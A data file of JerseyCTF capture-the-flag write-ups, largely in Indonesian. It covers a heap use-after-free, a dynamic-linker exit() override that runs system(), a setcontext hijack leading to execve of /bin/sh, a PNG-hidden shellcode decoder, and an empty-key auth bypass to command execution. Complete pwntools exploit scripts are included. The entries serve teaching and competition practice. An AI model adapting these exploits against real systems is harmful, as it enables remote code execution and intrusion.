        "code": "[ DISTRESS RELAY ]\njctf{r09U3_cART_hE4p_H!j4Ck}"
      },
      {
        "title": "Remediation",
        "content": "1. Setelah `free(serviceShuttle)`, set pointer ke `NULL` dan validasi sebelum dipakai lagi\n2. Pisahkan lifecycle object menu agar object freed tidak bisa diakses branch lain\n3. Gunakan struct integrity check (magic/version/state) sebelum dereference field pointer\n4. Hindari leak alamat internal (`%p`) di build produksi\n5. Tambahkan hardening logic: jika objek utama sudah di-jettison, disable opsi relay/broadcast\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "Start binary / connect remote\n        │\n        ▼\nRead leak: [ SHUTTLE HANDLE: <serviceShuttle> ]\n        │\n        ▼\nCompute vaultChunk = serviceShuttle - 0xF0\n        │\n        ▼\nMenu 1: free(serviceShuttle)\n        │\n        ▼\nMenu 2: malloc(0x40) -> reuses freed serviceShuttle chunk\n        │\n        ▼\nOverwrite at offset 0x20 with p64(vaultChunk)\n        │\n        ▼\nMenu 3: puts(serviceShuttle->relay)\n        │\n        ▼\nRelay pointer now points to vaultChunk -> flag printed"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\nBIN_PATH = './roguecart'\r\nHOST = 'roguecart.aws.jerseyctf.com'\r\nPORT = 1337\r\n\r\ncontext.binary = BIN_PATH\r\n\r\n\r\ndef start(local=False):\r\n    if local:\r\n        return process(BIN_PATH)\r\n    return remote(HOST, PORT)\r\n\r\n\r\ndef choose(io, n):\r\n    io.sendlineafter(b'> ', str(n).encode())\r\n\r\n\r\ndef exploit(io):\r\n    io.recvuntil(b'[ SHUTTLE HANDLE: ')\r\n    shuttle_handle = int(io.recvuntil(b']', drop=True), 16)\r\n\r\n    # Heap layout from allocation order in primeShuttle():\r\n    # vaultChunk, spacerA, spacerB, serviceShuttle, serviceShuttle->relay\r\n    # Each user allocation is 0x40 bytes, glibc chunk stride is 0x50.\r\n    # So vaultChunk is 3 chunks before serviceShuttle.\r\n    vault_chunk = shuttle_handle - (3 * 0x50)\r\n\r\n    # 1) Free serviceShuttle (dangling global pointer remains).\r\n    choose(io, 1)\r\n\r\n    # 2) Allocate maintenanceBlob size 0x40: reuses freed serviceShuttle chunk.\r\n    choose(io, 2)\r\n    io.recvuntil(b'[ FEED 64 BYTES OF PATCH DATA ]\\n')\r\n\r\n    # Overwrite serviceShuttle->relay pointer at offset 0x20 with vaultChunk.\r\n    payload = b'A' * 0x20 + p64(vault_chunk)\r\n    payload = payload.ljust(0x40, b'B')\r\n    io.send(payload)\r\n\r\n    # 3) Print relay => puts(vaultChunk) => flag contents.\r\n    choose(io, 3)\r\n    io.recvuntil(b'[ DISTRESS RELAY ]\\n')\r\n    flag = io.recvline().strip().decode(errors='ignore')\r\n    return flag\r\n\r\n\r\nif __name__ == '__main__':\r\n    io = start(local=args.LOCAL)\r\n    flag = exploit(io)\r\n    print(flag)\r\n    io.close()"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{r09U3_cART_hE4p_H!j4Ck}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-bin-russialove",
    "title": "From Russia With Love",
    "category": "Bin",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "Writeup for challenge From Russia With Love",
    "problemDescription": "Challenge ini terlihat seperti service yang \"ngetes\" implementasi function `exit()` dari library buatan user. Kuncinya bukan buffer overflow klasik, tapi **code execution by design** lewat proses compile dan dynamic linking.\n\nFlag berhasil didapat:\n\n`jctf{l1nker_m0re_l1k3_stink3r}`",
    "tools": [],
    "analysis": "File penting di challenge lokal:\n- `vuln.c`\n- `test.c`\n\nIsi logic `vuln.c` (inti):\n1. Service menerima input C source dari user.\n2. Disimpan ke `/tmp/libnew.c`.\n3. Di-compile jadi shared library `/tmp/libnew.so`.\n4. Binary tester di-compile dengan link `-lnew`.\n5. Program `/tmp/test` dijalankan.\n\nSementara `test.c` hanya memanggil:\n```c\nint main() {\n    exit(1);\n    fflush(0);\n}\n```\n\nArtinya, kalau kita kirim shared library dengan symbol `exit`, function itu akan dipakai saat `/tmp/test` dijalankan.",
    "solution": [
      {
        "title": "Kerentanan",
        "content": "Kerentanannya adalah **unsafe untrusted code compilation + execution**.\n\nService membiarkan user:\n- upload source C arbitrary,\n- compile jadi `.so`,\n- lalu menjalankan program yang memanggil function dari library itu.\n\nIni langsung memberi primitive RCE (Remote Code Execution) karena kita bisa isi `exit()` dengan command shell apa pun."
      },
      {
        "title": "Detail Penting Saat Eksploitasi",
        "content": "Ada satu behavior parsing input yang wajib diperhatikan:\n\n\n\nLoop berhenti ketika karakter sebelum newline adalah `}`. Kalau payload multi-line biasa, kiriman bisa kepotong saat ketemu `}` lebih cepat.\n\nSolusi paling stabil: kirim payload dalam format **one-line function body** (satu `}` penutup di akhir function), supaya source tidak terpotong.",
        "code": "while(fgets(buffer+i, sizeof(buffer), stdin) && buffer[(strlen(buffer)-2)] != '}') {\n    i = strlen(buffer);\n}"
      },
      {
        "title": "Payload Konsep",
        "content": "Kita override `exit()`:\n- jalankan shell command `cat /chal/flag.txt` (dan fallback `cat flag.txt`),\n- akhiri pakai `_exit(0)`.\n\nContoh payload C yang dikirim:",
        "code": "#include <unistd.h>\n#include <stdlib.h>\nvoid exit(int status){system(\"/bin/sh -c 'cat /chal/flag.txt 2>/dev/null; cat flag.txt 2>/dev/null'\");_exit(0);}"
      },
      {
        "title": "Bukti Hasil",
        "content": "Output service menampilkan isi direktori `/chal` dan file flag:\n- `/chal/flag.txt`\n- value: `jctf{l1nker_m0re_l1k3_stink3r}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\nimport re\r\n\r\nHOST = \"from-russia-with-love.aws.jerseyctf.com\"\r\nPORT = 9001\r\n\r\n# Penting: payload dibuat one-line agar tidak terpotong loop fgets pada service.\r\nPAYLOAD_C = (\r\n    '#include <unistd.h>\\n'\r\n    '#include <stdlib.h>\\n'\r\n    'void exit(int status){system(\"/bin/sh -c \\'cat /chal/flag.txt 2>/dev/null; cat flag.txt 2>/dev/null\\'\");_exit(0);}\\n'\r\n)\r\n\r\ndef main():\r\n    io = remote(HOST, PORT)\r\n\r\n    io.recvuntil(b\"make sure it's not too big!\\n\")\r\n    io.send(PAYLOAD_C.encode())\r\n\r\n    data = io.recvall(timeout=8)\r\n    text = data.decode(errors=\"ignore\")\r\n    print(text)\r\n\r\n    m = re.search(r\"jctf\\{[^\\n\\r}]*\\}\", text)\r\n    if m:\r\n        print(f\"\\n[+] FLAG: {m.group(0)}\")\r\n    else:\r\n        print(\"\\n[-] Flag belum ketemu di output\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{l1nker_m0re_l1k3_stink3r}",
    "lessonsLearned": "- Tidak semua pwn harus memory corruption; kadang logic deployment/build pipeline sendiri jadi exploit surface.\n- Menjalankan code hasil upload user (meski \"cuma buat test\") adalah high-risk design.\n- Dynamic linking symbol override (`exit`, `puts`, dll) bisa jadi jalur eksekusi yang sangat langsung."
  },
  {
    "id": "jerseyctf-bin-sat-term",
    "title": "CTF — sat-term",
    "category": "Bin",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** PWN / Binary Exploitation  \n**Difficulty:** Medium  \n**Flag:** `jctf{k3rbal_sp4ce_pr0gram_but_m4ke_it_b1nex}`",
    "problemDescription": "| # | Technique | Detail |\n|---|---|---|\n| 1 | Out-of-bounds write | `%lu` written into 2-byte field in `operation_settings` |\n| 2 | Context hijack | Corrupted `contexts` pointer gives control over `setcontext` target |\n| 3 | RCE via libc | Fake `ucontext_t` used to call `puts` (leak) and `execve` (command execution) |\n\n---",
    "tools": [
      "checksec",
      "objdump",
      "gdb"
    ],
    "analysis": "```bash\nfile satterm\nchecksec --file=satterm\nldd satterm\n```\n\nImportant points:\n- 64-bit ELF, dynamically linked\n- `Canary: ON`\n- `NX: ON`\n- `PIE: OFF`\n- `Full RELRO`\n\n`PIE OFF` is useful because global addresses are fixed.",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> Wow!! Take a look at this! We just gained access to a terminal managing a satellite up in orbit right now. Do you think the server communicating with that satellite is vulnerable?\n\n**Service:** `nc sat-term.aws.jerseyctf.com 5000`  \n**Given files:** `satterm`, `libc.so.6`, `ld-linux-x86-64.so.2`\n\n---"
      },
      {
        "title": "Step 2 — Reverse Important Functions",
        "content": "Using `objdump`/`nm`, key functions are:\n- `main`\n- `operation_status`\n- `operation_settings`\n- `operation_diagnose`\n- `initialize_operations`\n\nThe program uses `getcontext / makecontext / setcontext` to switch between command handlers."
      },
      {
        "title": "Step 3 — Bug Hunting",
        "content": "In `operation_settings`, this line is the core bug:\n\n- `scanf(\"%lu\", &nav_data.sync_ms)`\n\nBut `sync_ms` is only 2 bytes (`uint16_t`) inside `nav_data`.\n\nSo writing `%lu` (8-byte write) overflows into adjacent global memory and partially overwrites the global pointer `contexts`.\n\n---"
      },
      {
        "title": "Step 4 — Memory Corruption Primitive",
        "content": "`nav_data` is in `.bss`, and `contexts` is right after it.\n\nBy controlling `DOWNLINK SYNCHRONIZATION MS`, we can corrupt low 4 bytes of `contexts`, then point it to controlled data inside global `input` buffer."
      },
      {
        "title": "Step 5 — Fake `ucontext_t` + `setcontext` Control",
        "content": "When command `STATUS` is chosen, program does:\n- read `contexts[idx]`\n- call `setcontext(contexts[idx])`\n\nSince `contexts` now points to our fake structure, we control RIP/RDI/RSI/RDX via glibc `setcontext` restore layout."
      },
      {
        "title": "Step 6 — Stage 1 Leak libc",
        "content": "We build fake context for:\n- `RIP = puts@plt`\n- `RDI = puts@got`\n\nThen return to `operation_status`, parse leak, and compute:\n- `libc_base = leaked_puts - libc.sym['puts']`"
      },
      {
        "title": "Step 7 — Stage 2 Command Execution",
        "content": "Build second fake context for:\n- `RIP = execve@libc`\n- `RDI = \"/bin/sh\"`\n- `RSI = argv` where argv = `[\"/bin/sh\", \"-c\", \"cat /app/internal_satellite_comm.log; ...\", NULL]`\n\nThis executes shell command and prints the flag.\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "---",
        "code": "SETTINGS (%lu overflow)\n        │\n        ▼\noverwrite global contexts pointer\n        │\n        ▼\nsetcontext(fake_ucontext in input buffer)\n        │\n        ├─ Stage 1: puts(puts@got) → leak libc\n        │\n        └─ Stage 2: execve(\"/bin/sh\", [\"/bin/sh\",\"-c\",\"cat ...\"], NULL)\n                              │\n                              ▼\n                            FLAG"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\ncontext.binary = elf = ELF('./satterm', checksec=False)\r\nlibc = ELF('./libc.so.6', checksec=False)\r\ncontext.log_level = 'debug'\r\n\r\nHOST, PORT = 'sat-term.aws.jerseyctf.com', 5000\r\n\r\nINPUT = 0x404080\r\nCTX = INPUT + 0x8\r\nSTACK = INPUT + 0x358\r\n\r\n\r\ndef p64v(x):\r\n    return p64(x & 0xffffffffffffffff)\r\n\r\n\r\ndef build_fake_ctx(rip, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0, rsp=STACK, rbp=0, rbx=0, r12=0, r13=0, r14=0, r15=0):\r\n    buf = bytearray(b'\\x00' * 0x260)\r\n\r\n    def w(off, val):\r\n        buf[off:off+8] = p64v(val)\r\n\r\n    w(0x28, r8)\r\n    w(0x30, r9)\r\n    w(0x48, r12)\r\n    w(0x50, r13)\r\n    w(0x58, r14)\r\n    w(0x60, r15)\r\n    w(0x68, rdi)\r\n    w(0x70, rsi)\r\n    w(0x78, rbp)\r\n    w(0x80, rbx)\r\n    w(0x88, rdx)\r\n    w(0x98, rcx)\r\n    w(0xa0, rsp)\r\n    w(0xa8, rip)\r\n    w(0xe0, CTX + 0x210)\r\n    buf[0x1c0:0x1c4] = p32(0x1f80)\r\n\r\n    return bytes(buf)\r\n\r\n\r\ndef set_context_ptr(io, ptr):\r\n    # %lu into nav_data+0x1c overwrites contexts low dword with upper dword of value\r\n    val = ((ptr & 0xffffffff) << 32) | 0x41\r\n    io.sendline(b'SETTINGS')\r\n    io.sendlineafter(b'CHANGE [Y/N]: ', b'Y')\r\n    io.sendlineafter(b'APOAPSIS: ', b'1')\r\n    io.sendlineafter(b'PERIAPSIS: ', b'1')\r\n    io.sendlineafter(b'ORBIT INCLINE: ', b'1')\r\n    io.sendlineafter(b'DOWNLINK SYNCHRONIZATION MS: ', str(val).encode())\r\n    io.sendlineafter(b'SATELLITE SAFE MODE [Y/N]: ', b'N')\r\n    io.recvuntil(b'> ')\r\n\r\n\r\ndef trigger_ctx(io, fake_ctx, ret_addr):\r\n    payload = bytearray()\r\n    payload += b'STATUS\\x00\\x00'  # 8 bytes; command parsed as STATUS\r\n    payload += fake_ctx\r\n\r\n    ret_off = (STACK - INPUT)\r\n    need = ret_off + 8\r\n    if len(payload) < need:\r\n        payload += b'A' * (need - len(payload))\r\n    payload[ret_off:ret_off+8] = p64(ret_addr)\r\n\r\n    # send raw to preserve NUL bytes\r\n    io.send(payload + b'\\n')\r\n\r\n\r\ndef do_local():\r\n    io = process(['./satterm'])\r\n    set_context_ptr(io, CTX)\r\n    ctx1 = build_fake_ctx(rip=elf.plt['puts'], rdi=elf.got['puts'], rsp=STACK)\r\n    trigger_ctx(io, ctx1, elf.sym['operation_status'])\r\n    out = io.recvuntil(b'READ SUCCESS\\n', timeout=2)\r\n    print('LEAK OUT:', out)\r\n    io.close()\r\n\r\n\r\ndef do_remote():\r\n    io = remote(HOST, PORT)\r\n    io.recvuntil(b'> ')\r\n\r\n    set_context_ptr(io, CTX)\r\n\r\n    log.info('stage1 leak libc via puts(puts@got)')\r\n    ctx1 = build_fake_ctx(rip=elf.plt['puts'], rdi=elf.got['puts'], rsp=STACK)\r\n    trigger_ctx(io, ctx1, elf.sym['operation_status'])\r\n\r\n    data = io.recvuntil(b'LATEST DOWNLINK\\n', timeout=5)\r\n    lines = data.split(b'\\n')\r\n    leak_line = b''\r\n    for i, ln in enumerate(lines):\r\n        if b'COMMAND STATUS' in ln and i + 1 < len(lines):\r\n            leak_line = lines[i + 1]\r\n            break\r\n    if not leak_line:\r\n        log.failure(f'unexpected leak block: {data!r}')\r\n        return\r\n    leaked = u64(leak_line.ljust(8, b'\\x00'))\r\n    log.success(f'puts leak: {hex(leaked)}')\r\n\r\n    libc.address = leaked - libc.sym['puts']\r\n    log.success(f'libc base: {hex(libc.address)}')\r\n    execve = libc.sym['execve']\r\n    binsh = next(libc.search(b'/bin/sh\\x00'))\r\n    log.info(f'execve={hex(execve)} /bin/sh={hex(binsh)}')\r\n\r\n    io.recvuntil(b'> ')\r\n\r\n    cmd_addr = INPUT + 0x300\r\n    dashc_addr = INPUT + 0x360\r\n    argv_addr = INPUT + 0x380\r\n    cmd = b\"cat /flag* flag* 2>/dev/null; cat /app/flag* 2>/dev/null; exit\\x00\"\r\n    ctx2 = build_fake_ctx(rip=execve, rdi=binsh, rsi=argv_addr, rdx=0, rsp=STACK)\r\n    payload2 = bytearray()\r\n    payload2 += b'STATUS\\x00\\x00'\r\n    payload2 += ctx2\r\n    off = cmd_addr - INPUT\r\n    if len(payload2) < off:\r\n        payload2 += b'B' * (off - len(payload2))\r\n    payload2[off:off+len(cmd)] = cmd\r\n\r\n    off2 = dashc_addr - INPUT\r\n    if len(payload2) < off2 + 3:\r\n        payload2 += b'D' * (off2 + 3 - len(payload2))\r\n    payload2[off2:off2+3] = b\"-c\\x00\"\r\n\r\n    off3 = argv_addr - INPUT\r\n    if len(payload2) < off3 + 0x20:\r\n        payload2 += b'E' * (off3 + 0x20 - len(payload2))\r\n    payload2[off3:off3+8] = p64(binsh)\r\n    payload2[off3+8:off3+16] = p64(dashc_addr)\r\n    payload2[off3+16:off3+24] = p64(cmd_addr)\r\n    payload2[off3+24:off3+32] = p64(0)\r\n    io.send(payload2 + b'\\n')\r\n\r\n    out = io.recvrepeat(2)\r\n    print(out.decode('latin-1', 'ignore'))\r\n    io.close()\r\n\r\n\r\nif __name__ == '__main__':\r\n    if args.LOCAL:\r\n        do_local()\r\n    else:\r\n        do_remote()"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{k3rbal_sp4ce_pr0gram_but_m4ke_it_b1nex}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-bin-shallweplayagame",
    "title": "CTF — Shall We Play a Game?",
    "category": "Bin",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Pwn  \n**Difficulty:** Medium  \n**Flag:** `jctf{6r3371N65_Pr0F3550r_F41K3N}`",
    "problemDescription": "| # | Weakness | Detail |\n|---|---|---|\n| 1 | **Arbitrary code execution design** | Program intentionally maps RWX memory and executes bytecode from file data |\n| 2 | **Hidden dual payload mechanism** | `sprite_config` stores two descriptor sets; one decoy, one real |\n| 3 | **Steganographic asset abuse** | Malicious executable bytes live in PNG trailing data after `IEND` |\n\n---",
    "tools": [
      "checksec",
      "objdump",
      "Python for parser/decoder automation"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> A suspicious arcade game was left by the origional developer on the system. It runs a simple tic-tac-toe game, but something feels off...\n>\n> You were able to copy the program and its assets onto your system, dig into the binary, figure out what it's really doing, and flip the right switch before the game ends.\n>\n> **Hint:** The developer left notes about something called \"SPRT\" for rendering the image, and there aren't any other images for rendering the the actual X's and O's. The PNG file is larger than a typical board image. What lives after the end of a PNG?\n\n---"
      },
      {
        "title": "Step 1 — Inspect the Binary and Mitigations",
        "content": "Key observations:\n- ELF 64-bit PIE, dynamically linked\n- NX enabled, no stack canary, partial RELRO\n- Not stripped (very helpful for reversing)",
        "code": "file tictactoe\nchecksec --file=./tictactoe"
      },
      {
        "title": "Step 2 — Observe Program Behavior",
        "content": "Running the game normally shows a standard tic-tac-toe flow. However, after the game ends it prints:\n\n\n\nThis is suspicious and hints that hidden code executes at end-of-game.",
        "code": "[!] Oh no, you've been pwned!\n[!] This system has been compromised."
      },
      {
        "title": "Step 3 — Hunt for Interesting Symbols / Strings",
        "content": "Important findings:\n- `load_sprite`\n- `render_board_generic`\n- `render_board_optimized`\n- `sprite_config`\n- `board.png`\n- marker string `SPRT`\n\n---",
        "code": "nm -n tictactoe | rg \"render_board|load_sprite|main\"\nstrings -n 4 tictactoe | rg \"SPRT|board.png|pwned\""
      },
      {
        "title": "Step 4 — Reverse `render_board_optimized`",
        "content": "Disassembly shows this path does the following after `game_over`:\n\n1. Opens `board.png`\n2. Reads several chunks using offsets/sizes from `sprite_config`\n3. Allocates RWX memory with `mmap(PROT_READ|PROT_WRITE|PROT_EXEC)`\n4. Copies those bytes into RWX page\n5. `call rbx` (executes blob as code)\n\nSo this is intentional runtime shellcode execution from PNG data."
      },
      {
        "title": "Step 5 — Locate `sprite_config`",
        "content": "In `.rodata` we get a struct beginning with `SPRT` followed by 8 `(offset,size)` descriptors:\n\n- First 4 descriptors -> decoy payload\n- Second 4 descriptors -> hidden payload\n\nThis exactly matches the challenge hint about \"two sets of chunk descriptors\".\n\n---"
      },
      {
        "title": "Step 6 — Validate the PNG Tail",
        "content": "`board.png` has a large tail after `IEND`, which is where custom payload bytes are stored."
      },
      {
        "title": "Step 7 — Rebuild the Two Payload Blobs",
        "content": "Using descriptor pairs from `sprite_config`, concatenate bytes from `board.png`:\n- Blob A: entries `[0..3]`\n- Blob B: entries `[4..7]`\n\nEach blob has the same mini-shellcode layout:\n- Prologue code\n- Message bytes encrypted with XOR `0x80`\n\nDecoding with `byte ^ 0x80` after offset `0x35` gives:\n\n- Blob A message: fake compromise warning\n- Blob B message: real flag message\n\n---"
      },
      {
        "title": "Step 8 — \"Flip the Right Switch\"",
        "content": "The practical solve path is to extract and decode the second descriptor set (hidden payload), not the first decoy set.\n\nThat yields:\n\n\n\n---",
        "code": "[*] jctf{6r3371N65_Pr0F3550r_F41K3N}"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "Inspect binary + symbols\n        |\n        v\nFind render path that mmap RWX + call blob\n        |\n        v\nLocate SPRT/sprite_config in rodata\n        |\n        v\nExtract 8 chunk descriptors (two sets)\n        |\n        v\nRead corresponding offsets from board.png tail\n        |\n        v\nDecode payload messages (XOR 0x80)\n        |\n        v\nSet 1 = decoy warning\nSet 2 = real flag"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport re\r\nimport struct\r\n\r\nBIN_PATH = Path('tictactoe')\r\nPNG_PATH = Path('board.png')\r\n\r\n\r\ndef extract_sprite_entries(binary: bytes):\r\n    \"\"\"\r\n    Parse sprite_config from the embedded rodata pattern:\r\n    b'SPRT' + ver + count + reserved + 8*(off,size)\r\n    \"\"\"\r\n    m = re.search(b'SPRT\\\\x01\\\\x00\\\\x00\\\\x00', binary)\r\n    if not m:\r\n        raise RuntimeError('sprite_config magic not found in binary')\r\n\r\n    base = m.start()\r\n    magic, ver, count, reserved = struct.unpack_from('<4sIII', binary, base)\r\n    if magic != b'SPRT':\r\n        raise RuntimeError('invalid sprite_config magic')\r\n\r\n    entries = []\r\n    off = base + 16\r\n\r\n    # There are two descriptor sets in this challenge asset:\r\n    # 4 entries (decoy) + 4 entries (real flag payload)\r\n    for i in range(8):\r\n        chunk_off, chunk_size = struct.unpack_from('<II', binary, off + i * 8)\r\n        entries.append((chunk_off, chunk_size))\r\n\r\n    return {\r\n        'base': base,\r\n        'version': ver,\r\n        'count': count,\r\n        'reserved': reserved,\r\n        'entries': entries,\r\n    }\r\n\r\n\r\ndef decode_shell_blob(blob: bytes) -> str:\r\n    \"\"\"\r\n    Payload format:\r\n      - x86_64 shellcode prologue (0x35 bytes)\r\n      - encrypted message, each byte XOR 0x80\r\n    \"\"\"\r\n    if len(blob) <= 0x35:\r\n        return ''\r\n    msg = bytes(b ^ 0x80 for b in blob[0x35:])\r\n    return msg.decode('latin1', errors='ignore')\r\n\r\n\r\ndef main():\r\n    binary = BIN_PATH.read_bytes()\r\n    png = PNG_PATH.read_bytes()\r\n\r\n    sc = extract_sprite_entries(binary)\r\n    entries = sc['entries']\r\n\r\n    decoy_blob = b''.join(png[o:o + s] for (o, s) in entries[:4])\r\n    flag_blob = b''.join(png[o:o + s] for (o, s) in entries[4:8])\r\n\r\n    decoy_text = decode_shell_blob(decoy_blob)\r\n    flag_text = decode_shell_blob(flag_blob)\r\n\r\n    print('[*] sprite_config found at offset:', hex(sc['base']))\r\n    print('[*] version:', sc['version'], 'count:', sc['count'])\r\n    print('[*] decoy payload text:')\r\n    print(decoy_text.strip() or '<empty>')\r\n    print()\r\n    print('[*] hidden payload text:')\r\n    print(flag_text.strip() or '<empty>')\r\n\r\n    m = re.search(r'jctf\\{[^}]+\\}', flag_text)\r\n    if not m:\r\n        raise RuntimeError('flag pattern not found')\r\n\r\n    print('\\n[+] FLAG:', m.group(0))\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{6r3371N65_Pr0F3550r_F41K3N}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-bin-sos",
    "title": "Challenge Rev - SOS",
    "category": "Bin",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "Writeup for challenge Challenge Rev - SOS",
    "problemDescription": "Challenge ini ngasih dua artefak utama: satu binary `astro_beacon` dan satu teks `sos_message.txt` yang kelihatannya biasa aja. Petunjuk dari deskripsi bilang pesan SOS asli disembunyikan di dalam \"boring looking message\".\n\nFlag akhir yang didapat:\n\n`jctf{lost_in_space}`",
    "tools": [],
    "analysis": "String di binary menunjukkan fitur:\n\n- mode `encode` dan `decode`\n- output file `decode_result.txt`\n- prompt: `Paste the weird space message:`\n\nJadi cara paling cepat dan aman: pakai decoder internal dari binary buat mengekstrak bit tersembunyi.",
    "solution": [
      {
        "title": "Eksploitasi / Ekstraksi",
        "content": "Saya jalankan binary di mode decode (`d`) lalu feed isi `sos_message.txt`.\n\nHasilnya binary menulis `decode_result.txt`.\n\nIsi file ini ternyata gabungan:\n\n- teks biasa\n- deretan bit `0` dan `1` (payload tersembunyi)\n\nLangkah berikut:\n\n1. Ambil hanya karakter `0` dan `1`.\n2. Kelompokkan per 8 bit (1 byte).\n3. Konversi dari biner ke ASCII.\n\nHasil decode langsung membentuk:\n\n`jctf{lost_in_space}`"
      },
      {
        "title": "Catatan",
        "content": "Pendekatan ini tidak butuh brute force dan tidak perlu menebak mapping unicode manual, karena decoder asli dari challenge dipakai langsung untuk membongkar payload sebelum parsing final."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\nfrom pathlib import Path\r\n\r\nBIN = Path(\"astro_beacon\")\r\nMSG = Path(\"sos_message.txt\")\r\nOUT = Path(\"decode_result.txt\")\r\n\r\n\r\ndef run_decoder() -> str:\r\n    if not BIN.exists():\r\n        raise FileNotFoundError(\"astro_beacon tidak ditemukan\")\r\n    if not MSG.exists():\r\n        raise FileNotFoundError(\"sos_message.txt tidak ditemukan\")\r\n\r\n    payload = \"d\\n\" + MSG.read_text(encoding=\"utf-8\") + \"\\n\"\r\n    proc = subprocess.run(\r\n        [f\"./{BIN.name}\"],\r\n        input=payload,\r\n        text=True,\r\n        capture_output=True,\r\n        check=True,\r\n    )\r\n\r\n    if not OUT.exists():\r\n        raise RuntimeError(\r\n            \"decode_result.txt tidak terbentuk. Output binary:\\n\" + proc.stdout + proc.stderr\r\n        )\r\n\r\n    return OUT.read_text(encoding=\"utf-8\", errors=\"ignore\")\r\n\r\n\r\ndef extract_flag(decoded_text: str) -> str:\r\n    bits = \"\".join(ch for ch in decoded_text if ch in \"01\")\r\n    if len(bits) < 8:\r\n        raise ValueError(\"Bit tersembunyi tidak ditemukan\")\r\n\r\n    data = bytes(int(bits[i : i + 8], 2) for i in range(0, len(bits) - (len(bits) % 8), 8))\r\n    text = data.decode(\"utf-8\", errors=\"ignore\")\r\n\r\n    m = re.search(r\"jctf\\{[^}]+\\}\", text)\r\n    if not m:\r\n        raise ValueError(f\"Flag tidak ditemukan. Decoded text: {text!r}\")\r\n    return m.group(0)\r\n\r\n\r\ndef main() -> None:\r\n    decoded = run_decoder()\r\n    flag = extract_flag(decoded)\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{lost_in_space}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-bin-tarpit",
    "title": "JerseyCTF - Tarpit (PWN)",
    "category": "Bin",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "Writeup for challenge JerseyCTF - Tarpit (PWN)",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- Judul: `Tarpit`\n- Kategori: `pwn`\n- Endpoint: `nc tarpit.aws.jerseyctf.com 9001`\n\nDeskripsi challenge bilang ada service Python untuk ekstrak tar, dan ada jalur submit RSA public key untuk login admin.\n\n---"
      },
      {
        "title": "Recon awal",
        "content": "Saat connect ke service:\n\n- Muncul banner:\n  - `Python 3.12.8`\n  - `Ready to read in file`\n\nService terlihat seperti baca stream tar, tapi setelah ngirim tar valid, baru muncul prompt berikut:\n\n`If you are a developer trying to access data, press q and provide your RSA public key to login, otherwise press any other key and pipe in a tar file`\n\nIni berarti alurnya:\n1. kirim tar file dulu\n2. lalu pilih mode developer (`q`) untuk autentikasi key\n\n---"
      },
      {
        "title": "Mapping alur auth",
        "content": "Setelah pilih `q`, service minta input:\n\n- `RSA KEY:`\n\nOutput berikutnya yang teramati:\n- `RECEIVED`\n- `OPENED`\n- `file `\n- kalau key random: `Access Denied`\n- kalau key kosong: `EXECUTING`\n\nTemuan penting: **input key kosong mem-bypass auth** dan masuk ke mode eksekusi command.\n\n---"
      },
      {
        "title": "Bukti RCE",
        "content": "Sesudah muncul `EXECUTING`, koneksi jadi seperti shell command executor.\n\nCommand yang berhasil dijalankan:\n- `id`\n- `whoami`\n- `pwd`\n- `ls`\n- `cat flag*`\n\nHasil penting:\n- `uid=0(root)`\n- working dir `/chal`\n- ada file `flag.txt`\n\nAmbil flag dengan:\n\n\n\n---",
        "code": "cat /chal/flag.txt"
      },
      {
        "title": "Catatan akar masalah (root cause)",
        "content": "Challenge ini kemungkinan punya bug auth logic di jalur developer login:\n\n- kondisi pembanding key/public key salah\n- atau validasi kosong (`empty input`) tidak ditolak\n- lalu masuk branch `EXECUTING` yang mengeksekusi command di server\n\nIntinya: **autentikasi bisa dibypass dengan input kosong, lalu langsung dapat RCE.**"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
